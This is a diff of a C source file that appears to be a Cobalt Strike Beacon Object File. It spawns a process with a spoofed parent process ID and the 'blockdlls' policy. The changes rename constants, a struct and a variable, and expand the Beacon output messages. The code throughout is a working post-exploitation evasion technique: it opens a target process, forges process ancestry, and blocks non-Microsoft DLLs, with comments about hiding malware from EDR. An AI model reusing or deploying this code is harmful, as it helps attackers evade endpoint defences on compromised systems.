@@ -14,10 +14,10 @@
 // Successful compilation on:
 // - Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux
 // - x86_64-w64-mingw32-gcc (GCC) 10-win32 20210110
-// Defined in WinBase.h on windows system
-#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON   0x0000100000000000
-#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
-#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    0x00020000
+// Defined in WinBase.h on windows system - has "2" at end to avoid duplicate declaration warnings/errors on macOS
+#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2   0x0000100000000000
+#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY2 0x00020007
+#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS2    0x00020000
 /*                              RCX           RDX               R8                            R9      [RSP+0x0]     [RSP+0x8] [RSP+0x10]
 UpdateProcThreadAttribute(si.lpAttributeList,   0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy),    NULL,     NULL);
 00007FF6BF71195A  mov         qword ptr[rsp + 30h], 0
@@ -27,10 +27,10 @@ UpdateProcThreadAttribute(si.lpAttributeList,   0, PROC_THREAD_ATTRIBUTE_MITIGAT
 	00007FF6BF71197C  mov         r8d, 20007h
 	- R8D = PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 20007h = 0x00020007 = DWORD 4 bytes
 */
-typedef struct _STARTUPINFOEXA {
+typedef struct _STARTUPINFOEXA2 {
     STARTUPINFOA StartupInfo;
     LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
-} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
+} STARTUPINFOEXA2, *LPSTARTUPINFOEXA2;
 
 WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
 WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
@@ -42,10 +42,10 @@ DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$DeleteProcThreadAttributeList (L
 WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
 WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
 
-void SpawnProcess(char * peName, DWORD pid){
+void SpawnProcess(char * peName, DWORD ppid){
     // Declare variables/struct
     // (07/20/21) - Changed from STARTUPINFOEX -> STARTUPINFOEXA
-    STARTUPINFOEXA sInfoEx = { sizeof(sInfoEx) };
+    STARTUPINFOEXA2 sInfoEx = { sizeof(sInfoEx) };
     //   STARTUPINFOEXA - https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
     //   STARTUPINFOA   - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
     //   typedef struct _STARTUPINFOEXA {
@@ -62,15 +62,15 @@ void SpawnProcess(char * peName, DWORD pid){
     // "Nope, Falcon loads perfectly fine with 'blockdlls' enabled and hooks ntdll. umppcXXXX.dll (Falcon's injected DLL) is digitally signed by MS so no wonder this doesn't prevents EDR injection pic.twitter.com/lDT4gOuYSV"
     //   — reenz0h (@Sektor7Net) October 25, 2019
     // https://blog.xpnsec.com/protecting-your-malware/
-    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2;
 
     // Get a handle to the target process
-    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
+    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)ppid);
     if (hProc != NULL) {
-        BeaconPrintf(CALLBACK_OUTPUT, "Returned Handle: %x", hProc);
+        BeaconPrintf(CALLBACK_OUTPUT, "Opened handle 0x%x to process %d(PID)", hProc, ppid);
     }
     else{
-        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get handle to process: %d(PID)", pid);
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get handle to process: %d(PID)", ppid);
         return;
     }
     // Create an Attribute list. Make sure to have the second argument as 2 since we need to have 2 attributes in our lost
@@ -85,15 +85,15 @@ void SpawnProcess(char * peName, DWORD pid){
     // Here we call UpdateProcThreadAttribute twice to make sure our new process will spoof the PPID and start with CFG set to block non MS signed DLLs from loading
     // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribut
     // Spoof the parent process ID (PPID) using the handle to the process we got from the PID
-    KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL);
+    KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS2, &hProc, sizeof(HANDLE), NULL, NULL);
     // Set our new process to not load non-MS signed DLLs - AKA blockDll functional;ity in cobaltstrike
-    KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
+    KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY2, &policy, sizeof(policy), NULL, NULL);
     sInfoEx.lpAttributeList = pAttributeList;
 	
     // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
     WINBOOL check = KERNEL32$CreateProcessA(NULL, peName, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&sInfoEx, &pInfo);
     if (check){
-        BeaconPrintf(CALLBACK_OUTPUT, "Successfully spawned process: %s", peName);
+        BeaconPrintf(CALLBACK_OUTPUT, "Success! Spawned process: %s | PID: %d | PPID: %d", peName,pInfo.dwProcessId,ppid);
     }
     // Cleanup the attribute list and close the handle to the parent process we spoofed
     KERNEL32$DeleteProcThreadAttributeList(pAttributeList);
@@ -102,10 +102,10 @@ void SpawnProcess(char * peName, DWORD pid){
 void go(char * args, int len) {
     datap parser;
     char * peName;
-    DWORD pid;
+    DWORD ppid;
     BeaconDataParse(&parser, args, len);
     peName = BeaconDataExtract(&parser, NULL);
-    pid = BeaconDataInt(&parser);
-    BeaconPrintf(CALLBACK_OUTPUT, "Attempting to openProcess: %d(PID)", pid);
-    SpawnProcess(peName,pid);
+    ppid = BeaconDataInt(&parser);
+    BeaconPrintf(CALLBACK_OUTPUT, "Attempting to openProcess: %d(PID)", ppid);
+    SpawnProcess(peName,ppid);
 }
